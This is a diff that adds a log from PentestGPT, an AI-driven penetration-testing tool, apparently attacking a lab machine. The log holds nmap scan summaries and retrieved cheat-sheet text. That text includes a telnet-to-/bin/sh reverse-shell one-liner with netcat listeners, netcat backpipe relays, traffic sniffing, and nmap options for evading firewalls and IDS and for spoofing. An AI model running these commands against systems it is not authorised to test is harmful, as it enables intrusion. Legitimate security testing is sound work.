@@ -1,0 +1,99 @@
+2024-04-25 10:14:40,450 - INFO - pentestgpt.utils.rag.Local_RAG - Created FAISS index
+2024-04-25 10:14:40,450 - INFO - pentestgpt.utils.rag.Local_RAG - Initialized Local_RAG
+2024-04-25 10:15:09,259 - INFO - pentestgpt.utils.rag.Local_RAG - - privilege_escalation_git.md [Chunk 2] (Score: 1.05) | prompt: The task is a Linux machine at ip 10.129.81.246 | rag-data: -i :80
+grep 80 /etc/services
+netstat -antup
+netstat -antpx
+netstat -tulpn
+chkconfig --list
+chkconfig --list | grep 3:on
+last
+w
+
+
+
+Whats cached? IP and/or MAC addresses
+arp -e
+route
+/sbin/route -nee
+
+
+
+Is packet sniffing possible? What can be seen? Listen to live traffic
+# tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
+tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21
+
+
+
+Have you got a shell? Can you interact with the system?
+# http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
+nc -lvp 4444    # Attacker. Input (Commands)
+nc -lvp 4445    # Attacker. Ouput (Results)
+telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
+
+
+
+Is port forwarding possible? Redirect and interact with traffic from another view
+# rinetd
+# http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch
+
+# fpipe
+# FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
+FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
+
+# ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
+ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
+ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
+
+# mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe
+mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay
+mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80
+2024-04-25 10:16:22,866 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 2] (Score: 0.98) | prompt: Summary:
+
+1. Nmap version 7.94SVN is being used for the security testing.
+2. The target IP address is being scanned.
+3. Host seems down, so it may be blocking ping probes.
+4. Suggestion to use the -Pn option to scan the host if it is really up and blocking ping probes.
+5. The scan completed in 3.31 seconds.
+
+Note: The input content is less than 8000.0 words, as specified. | rag-data: ' (milliseconds),
+  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
+  -T<0-5>: Set timing template (higher is faster)
+  --min-hostgroup/max-hostgroup <size>: Parallel host scan group sizes
+  --min-parallelism/max-parallelism <numprobes>: Probe parallelization
+  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: Specifies
+      probe round trip time.
+  --max-retries <tries>: Caps number of port scan probe retransmissions.
+  --host-timeout <time>: Give up on target after this long
+  --scan-delay/--max-scan-delay <time>: Adjust delay between probes
+  --min-rate <number>: Send packets no slower than <number> per second
+  --max-rate <number>: Send packets no faster than <number> per second
+## FIREWALL/IDS EVASION AND SPOOFING:
+  -f; --mtu <val>: fragment packets (optionally w/given MTU)
+  -D <decoy1,decoy2[,ME],...>: Cloak a scan with decoys
+  -S <IP_Address>: Spoof source address
+  -e <iface>: Use specified interface
+  -g/--source-port <portnum>: Use given port number
+  --proxies <url1,[url2],...>: Relay connections through HTTP/SOCKS4 proxies
+  --data <hex string>: Append a custom payload to sent packets
+  --data-string <string>: Append a custom ASCII string to sent packets
+  --data-length <num>: Append random data to sent packets
+  --ip-options <options>: Send packets with specified ip options
+  --ttl <val>: Set IP time-to-live field
+  --spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address
+  --badsum: Send packets with a bogus TCP/
+2024-04-25 10:19:38,891 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 4] (Score: 0.91) | prompt: Summary:
+
+1. Nmap version 7.94SVN is being used for the security testing.
+2. The target IP address is 10.129.81.246.
+3. Host is up with a latency of 0.025s.
+4. 999 filtered tcp ports are not shown.
+5. Port 22 is open, running SSH service on OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0).
+6. Service detection is performed and results are submitted to Nmap for any corrections.
+7. The scan completed in 6.75 seconds.
+
+Note: The input content is less than 8000.0 words, as specified. | rag-data:  10000 -Pn -p 80
+### FULL-SCAN:
+    ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.11.214 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+    nmap -p$ports -Pn -sC -sV 10.10.11.214
+
